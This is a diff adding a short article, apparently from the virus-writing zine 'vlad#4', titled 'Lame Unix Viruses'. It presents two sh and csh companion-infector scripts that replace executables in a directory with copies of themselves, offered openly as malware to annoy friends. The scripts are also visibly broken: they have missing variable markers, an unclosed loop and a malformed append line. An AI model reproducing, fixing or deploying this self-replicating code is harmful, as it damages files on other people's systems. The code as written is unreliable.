@@ -1,0 +1,63 @@
+
+  Lame Unix Viruses
+  +---------------+
+
+  Well, you might have read the title to this article and thought, well
+  if the damn thing is lame.. why the fuck is it in vlad#4 ?!  This can
+  be answered quite simply, we had one free space! :)  It was a bit of
+  a dilemma to begin with, we had four articles and one space.  The problem
+  was they were all kinda lame.  So it was a lame pick of the month episode.
+
+  Out of the four articles this was the leastest lamest.  Well actually
+  I don't know about that, but anyway it was the most different one we
+  had sitting there.  Just to prove the title, the author of these
+  masterpieces asked to remain anonymous to save his reputation.
+
+  These "viruses" are the equivalent of a DOS batch file infector because
+  they are written in shell language.  They function similarly to companion
+  infectors by renaming the original file and replacing it with themselves.
+  Disinfection is simple by 'mv'ing (moving) the original files back.
+
+  Anyway, perhaps someone is interested so here they are.  There isn't
+  much use for them except to annoy your friends when it messes up all
+  the files in their directory.
+
++-----------------------------------+
+#!/bin/sh
+# Dumb Unix Virus
+# I dont wanna write anutha dumb unix virus qark, i wont
+# Due to excess lameness, dont distribute
+# <Author's name withheld for obvious reasons>
+for files in *
+do
+ if [ -x files ]  
+ then
+     if [ ! -d files ]
+     then
+       mv files files.EVILVIRUS.HELPME
+       cp $0 files
+       chmod +x files
+       files.EVILVIRUS.HELPME
+     fi
+   fi
+
++-----------------------------------+
+
+cat << _EOF >unix.virus
+
+
+#!/bin/csh
+# Dumber Unix Virus
+#  by 
+#     SumUtherGuy
+foreach i (*)
+mv $i bak.$i
+cp $0 $i  
+i >> $i
+
+end
+_EOF
+
++-----------------------------------+
+
+
